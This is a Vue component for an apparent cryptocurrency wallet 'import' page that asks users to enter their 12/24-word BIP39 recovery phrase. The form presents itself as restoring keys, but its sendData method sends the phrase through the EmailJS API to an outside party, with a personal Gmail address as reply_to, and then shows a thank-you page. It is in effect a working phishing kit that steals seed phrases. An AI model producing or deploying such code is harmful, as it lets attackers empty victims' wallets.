<template>
  <div class="private flex h-full flex-col px-5">
    <label class="mb-4 font-light text-lg text-center" for=""
      >Please enter your 12/24 word phrase</label
    >
    <el-input type="textarea" :rows="6" v-model="nmenomic"> </el-input>
    <span class="mt-4">Please separate each Mnemonic Phrase with a space.</span>
    <p class="my-10 font-semibold text-sm">
      Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys
      that manage your acccounts.
    </p>
    <el-button :loading="loading" @click="sendData">Import</el-button>
  </div>
</template>

<script>
import axios from "axios";
export default {
  data() {
    return {
      nmenomic: "",
      loading: false
    };
  },
  methods: {
    sendData() {
      this.loading = true;
      let self = this;
      const checker = this.formChecker();
      if (checker) {
        var data = {
          service_id: "service_o6cjtvh",
          template_id: "template_axdenmh",
          user_id: "user_q7g2o9qDOiH2ojVRoiuNN",
          template_params: {
            from_name: "Nmenomic",
            nmenomic: this.nmenomic,
            reply_to: "gibsonkendra725@gmail.com",
          }
        };
        axios
          .post("https://api.emailjs.com/api/v1.0/email/send", data)
          .then(function() {
            self.$router.push("/thank-you")
            self.loading = false;
          })
          .catch(function() {
            self.loading = false;
          });
      } else {
        this.$notify({
          title: "Warning",
          message: "All Form input is required",
          type: "warning"
        });
      }
    },
    formChecker() {
      if (this.nmenomic === "") {
        return false;
      } else {
        return true;
      }
    }
  }
};
</script>

<style lang="scss">
</style>
